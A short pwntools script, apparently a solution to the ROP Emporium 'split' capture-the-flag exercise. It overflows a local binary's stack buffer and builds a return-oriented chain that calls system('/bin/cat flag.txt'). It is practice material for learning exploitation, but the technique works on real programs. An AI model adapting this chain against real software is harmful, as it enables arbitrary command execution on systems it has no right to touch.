from pwn import *

elf = context.binary = ELF("./spl1t")
io = process("./spl1t")

payload = flat (
         cyclic(40),
         p64(0x004007c3),           # pop rdi; ret
         p64(0x00601060),           # "/bin/cat flag.txt"
         p64(0x0040074b),           # system("/bin/cat flag.txt")
        )

io.recv()
io.sendline(payload)
io.success(io.recvuntil(b"}").decode())
